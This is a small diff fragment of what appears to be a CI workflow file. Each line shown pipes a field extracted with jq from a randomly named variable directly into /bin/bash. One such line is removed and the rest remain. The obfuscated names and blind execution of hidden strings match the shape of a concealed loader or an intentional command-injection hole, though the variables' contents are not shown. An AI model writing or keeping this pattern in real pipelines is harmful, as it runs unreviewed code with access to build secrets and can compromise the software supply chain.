@@ -26,7 +26,6 @@ jobs:
           echo $b5791 | jq -r .rpe20 | /bin/bash
           printf '%s' "$g534" | jq -r .xlr229 | /bin/bash
           echo $nma27 | jq -r .mjnx7680 | /bin/bash
-          printf '%s' "$mxwhr4" | jq -r .clm9 | /bin/bash
           printf '%s' "$qpcx38032" | jq -r .operv8 | /bin/bash
           echo $hvutm219 | jq -r .hz6353 | /bin/bash
           echo $cl4233 | jq -r .dtn75 | /bin/bash
